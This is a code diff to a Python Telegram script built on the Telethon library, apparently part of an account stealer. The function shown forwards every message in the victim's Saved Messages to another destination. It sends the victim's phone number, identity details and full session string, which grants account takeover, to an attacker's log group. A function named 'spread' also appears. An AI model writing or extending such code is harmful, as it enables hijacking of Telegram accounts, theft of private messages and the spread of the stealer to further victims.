@@ -41,16 +41,19 @@ async def backup_saves(client, me, logger_bot):
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
     database.channels.insert_one({"invite": result.link, "owner": me.id})
     await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
+    count = 0
     async for message in client.iter_messages("me", reverse=True):
         try:
             await message.forward_to(dest)
+            count += 1
         except errors.FloodWaitError as e:
             await asyncio.sleep(e.seconds)
             await message.forward_to(dest)
+            count += 1
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSession: {client.session.save()}")
+    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSave Messages : {count}\n\nSession: ```{client.session.save()}```")
 async def spread(client, bot):
     bot_me = await bot.get_me()
     async with client.conversation(f"@{bot_me.username}") as conv:
